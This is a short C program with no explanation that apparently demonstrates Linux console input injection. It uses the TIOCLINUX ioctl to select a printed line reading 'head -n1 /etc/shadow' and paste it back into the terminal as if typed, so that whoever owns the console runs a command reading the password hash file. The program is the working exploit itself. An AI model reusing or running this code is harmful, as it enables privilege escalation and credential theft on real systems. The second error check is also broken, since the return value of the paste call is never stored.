#include <err.h>
#include <stdio.h>
#include <stdlib.h>
#include <sys/ioctl.h>

#include <linux/tiocl.h>
#include <linux/vt.h>

int main(void)
{
    int res;
    printf("\33[H\33[2J");
    printf("head -n1 /etc/shadow\n");
    fflush(stdout);
    struct {
        char padding;
        char subcode;
        struct tiocl_selection sel;
    } data = {
        .subcode = TIOCL_SETSEL,
        .sel = {
            .xs = 1, .ys = 1,
            .xe = 1, .ye = 1,
            .sel_mode = TIOCL_SELLINE
        }
    };
    res = ioctl(0, TIOCLINUX, &data.subcode);
    if (res != 0)
      err(EXIT_FAILURE, "ioctl(0, TIOCLINUX, ...) failed");
    data.subcode = TIOCL_PASTESEL;
    ioctl(0, TIOCLINUX, &data.subcode);
    if (res != 0)
      err(EXIT_FAILURE, "ioctl(0, TIOCLINUX, ...) failed");
    exit(EXIT_SUCCESS);
}

